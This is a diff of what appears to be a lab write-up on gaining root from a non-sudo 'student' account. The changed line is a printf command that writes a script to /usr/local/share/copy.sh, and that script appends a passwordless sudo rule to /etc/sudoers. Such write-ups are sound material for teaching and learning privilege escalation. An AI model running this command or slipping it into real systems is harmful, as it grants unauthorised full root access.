@@ -25,7 +25,7 @@ Gain **root privileges** from a **non-sudo user** (`student`) by exploiting a **
 
  🧠 Command Used:
 
-printf '#!/bin/bash\necho "student ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
+printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
 
 
  🔍 Explanation of the Command:
